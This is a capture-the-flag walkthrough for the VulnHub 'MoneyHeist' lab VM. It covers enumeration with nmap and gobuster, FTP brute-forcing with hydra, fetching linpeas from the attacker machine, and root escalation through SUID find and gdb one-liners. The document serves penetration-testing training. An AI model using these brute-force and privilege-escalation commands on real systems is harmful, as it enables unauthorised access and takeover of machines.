To Download the Iso file:https://www.vulnhub.com/entry/moneyheist-catch-us-if-you-can,605/
Lets scan the network To identify the target ip adde:
```bash
sudo netdiscover -i eth0
```

Results:<img src="./img/Screenshot 2024-08-31 193940.png"></img>
We got it. Lets perform the Namp Scan:
```bash
sudo nmap -sC -sV 192.168.0.10
```
<img src="./img/Screenshot 2024-08-31 193952.png"></img>
In this scan we  will come to know the target version and other details.
And the target has one ftp and http open lets see into the ftp port first.
Connect through Anonymous and password in nothing.
```bash
ftp 192.168.0.10
```
search it using 'ls' command.
we got a txt file named as note.txt.
Transfer that file into local machine.
```bash
get note.txt
```
<img src="./img/Screenshot 2024-08-31 194747.png"></img>
cat that file.
```bash
cat note.txt
```
Result:
```text
//*//  Hi I'm Ángel Rubio partner of investigator Raquel Murillo. We need your help to catch the professor, will you help us ?  //*//
```
Lets take a look into the http port.
By searching it on the browser
```text
192.168.0.10
```
It gives image try downloading it by clicking saves as method.
And use exiftool 
```bash
exiftool t.jpeg
```
Nothing found. lets use gobuster for directory busting
```bash
gobuster dir -u http://192.168.0.10/ -w /usr/share/wordlists/dirb/common.txt
```
Result:
<img src="./img/Pasted image 20240831200931.png"></img>Look into that robots directory in web browser.
```text
http://192.168.0.10/robots/
```
Its have a jpeg image but it has some error to open .so download it by using the cmd.
```bash
wget http://192.168.0.10/robots/tokyo.jpeg
```
check the file.
```bash
file tokyo.jpeg
```
It is in type of file that contain data but it has some error. lets rectify it using hexeditor.
```bash
hexeditor tokyo.jpeg
```
lets look for the common file signature.
<img src="./img/Screenshot 2024-08-31 202204.png"></img>
compare with this common file signs.<img src="./img/Screenshot 2024-08-31 200405.png"></img>
And its look like it is jpeg file only ,but first four bit are wrong change it.
0A 4A EE E0 ->FF D8 FF E0.
<img src="./img/Screenshot 2024-08-31 202601.png"></img>
Save it by using 'ctrl+x'
now open it.
<img src="./img/Screenshot 2024-08-31 202745.png"></img>
Lets check another directory called /gate/
```bash
192.168.0.10/gate/
```
we got a gate.exe file.Download that file and check the file information by using cmd.
```bash
file gate.exe
```
Result:
gate.exe: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified, last modified Sun, Nov 16 2020 11:07:30, uncompressed size 13, method=store
The message says the file zipped and we have to unzip it bu using cmd.
```bash
unzip gate.exe -d gate
```
And the result says it is a bad zip file means it is internally corrupted.
Lets fix it.
```bash
zip -ff agte.exe -d gate
```
But the results it contains no entry.
Next the logical step is to try strings cmd
```bash
strings gate.exe
```
we got it.
Result:
```text
noteUT
/BankOfSp41n
noteUT
```
This is a internal url of target system. Search this directory in http via the browser.
<img src="./img/Screenshot 2024-09-06 204554.png"></img>
We got a picture. lets try some directory busting using gobuster once again and specify the type of file we want like php,html,txt by using '-x' parameter.
```bash
gobuster dir -u http://192.168.0.10/BankOfSp41n/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt 
```
Result:
<img src="./img/Screenshot 2024-09-06 215136.png"></img>

We got a login page which located in directory as /login.php.
<img src="./img/Screenshot 2024-09-06 215450.png"></img>
Now visit the source code of the page. And check some information.
And i got java script file in the name of "CR3D5.js" .lets check it.
<img src="./img/Screenshot 2024-09-06 215709.png"></img>
And i got username and password.
<img src="./img/Screenshot 2024-09-06 215827.png"></img>
```bash
user:anonymous
password:B1tCh
```
Successfully logged in.
<img src="./img/Screenshot 2024-09-06 220130.png"></img>
Now view the source code of the web page.
Here i got a info in the comment section.
<img src="./img/Screenshot 2024-09-06 220339.png"></img>
This hint suggest that we can update the username as "Arturo" and brute force it against the ftp service. For brute forcing we can use Hydra tool.
```bash
hydra -l arturo -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.10
```
We got the password for the username arturo.
<img src="./img/Screenshot 2024-09-06 222011.png"></img>
```bash
user:arturo
password:corona
```
Now connect with ftp in the username of arturo.
```bash
ftp 192.168.0.10
```
Enter the login details.
we logged i successfully.
list all files.
```bash
ls -la
```
There is txt file get that file using get command.
```bash
get secret.txt
```
<img src="./img/Screenshot 2024-09-06 222311.png"></img>
And cat that file ,we got a message.
```text
/*/ Arturo gets phone somehow and he call at police headquater /*/

        " Hello, I'm Arturo, I'm stuck in there with almost 65-66 hostages,
        and they are total 8 with weapons, one name is Denver, Nairo.... "

```
In this hint we got some other usernames like Denver,Nairo.
Lets check the home directory.
```bash
pwd
```
<img src="./img/Screenshot 2024-09-06 223118.png"></img>
we got "/home/arturo".
switch back into the home directory using "cd .."
And list the files using "ls -la"
We got some other directories in the name of denver,nairobi,tokyo.
But we can not change the directories through this ftp connection. So, we have to check some other available connections. Once we have perform the nmap scan and check the any other available connections. 
```bash
nmap -sC -sV 192.168.0.10 -p-
```
<img src="./img/Screenshot 2024-09-06 223854.png"></img>
We got a ssh port connection which is running in the port number 55001. Lets establish a connection in username of "Arturo".
```bash
ssh arturo@192.168.0.10 -p 55001   
```
It worked.
<img src="./img/Screenshot 2024-09-06 224153.png"></img>
Now change into the home directory using "cd /home"
And change into denver directory but the user arturo does not have the permission to change directory.
<img src="./img/Screenshot 2024-09-06 224952.png"></img>
So we have to perform the privilege escalation.
First check if the user Arturo has the sudo privilege or not by running this cmd.
```bash
sudo -l
```
And this username does not have the sudo privilege.
Lets use linpeas script. This script will find all vulnerablities that are availabe in the target the system.So first download it from github.
https://github.com/peass-ng/PEASS-ng/releases
click->linpeas.sh
And transfers  the scriptinto the target system by using http connection via port 8000
I'm using python for the connection.
```bash
python3 -m http.server
```
And get the file in target system using wget cmd.
```bash
wget http://192.168.0.4:8000/linpeas.sh
```
<img src="./img/Screenshot 2024-09-06 231733.png"></img>
And make the file executable.
```bash
chmod +x linpeas.sh
```
And now run the script.
```bash
./linpeas.sh
```
By analyzing  the output  there exist some critical files under the "Files with interesting permissions"
They are /sed,/find,/gdb.
Goto GTFOBins site: https://gtfobins.github.io/
The user arturo does not have a sudo privilege.So search for it in GTFOBins.
Under /find in GTFOBins  found a SUID scmd
```bash
find . -exec /bin/bash -p \; -quit
```
Now we got bash shell.
Now try to change the directory into Denver
successfully changed and now list all files.
```bash
ls -la
```
We got two files note.txt and secret_diary files ,cat that out.
<img src="./img/Screenshot 2024-09-07 110128.png"></img>
<img src="./img/Screenshot 2024-09-07 110447.png"></img>
And we got internal url of the target system.
```bash
/BankOfSp41n/0x987654/
```
<img src="./img/Screenshot 2024-09-07 110838.png"></img>
In this directory we got key.txt file. And it looks like morse code.So,try to decode it using online morse code decoder. 
https://morsecode.world/international/translator.html
<img src="./img/Screenshot 2024-09-07 111029.png"></img>
Now the morse code is translated into tap code format.Once again decode the tap code using online decoder. https://cryptii.com/pipes/tap-codeNow .
<img src="./img/Screenshot 2024-09-07 111204.png"></img>
we got some strings.
```bash
jvdvanhhajmfeepcp
```
Based on the format it looks like ROT13 method. Again decode the ROT13 using online decoder.
https://cryptii.com/pipes/rot13-decoder.
<img src="./img/Screenshot 2024-09-07 114655.png"></img>
```bash
wiqinauunwzsrrcpc
```
This strings look in the format of Affine cipher format try to decode it. https://cryptii.com/pipes/affine-cipher
<img src="./img/Screenshot 2024-09-07 114703.png"></img>
```bash
iamabossbitchhere
```
It worked.
Now try to connect via ssh connection
```bash
ssh nairobi@192.168.0.10 -p 55001
password:iamabossbitchhere
```
list all the available files. We got a  note.txt file.
cat that out.
<img src="./img/Screenshot 2024-09-07 112903.png"></img>
other than that nothing is here.
check for sudo privilege.
```bash
sudo -l
```
It doesn't have. Once again try the linpeas.sh script to find some vulnerblities.
```bash
python3 -m http.server [host machine]
wget http://192.168.0.10:8000/linpeas.sh [target] machine
```
Run the script.
```bash
./linpeas.sh
```
We got the /gdb SUID vulerablitiy.
```bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```
<img src="./img/Screenshot 2024-09-07 114213.png"></img>
Now change into tokyo directory.
list all files.
there is a file ",sudo_as_admin_successful"
cat that out.
```bash
cat .sudo_as_admin_successful
```
Result:
```text
Romeo Oscar Oscar Tango Stop Papa Alfa Sierra Sierra Whiskey Oscar Romeo Delta : India November Delta India Alfa One Nine Four Seven
```
Its look like a phonetic alphabet format.
Try to decode it.
<img src="./img/Screenshot 2024-09-07 121214.png"></img>
We got it.
```bash
username:root
password:india1947
```
Try to login.
```
su root
```
Enter the password.
we logged in successfully. Change the directory into root.
List all the files to see the root flag. We got "proof.txt"file. Cat that out.
```bash
cat proof.txt
```
<img src="./img/Screenshot 2024-09-07 120911.png"></img>
We got the final flag .
Successfully Completed.

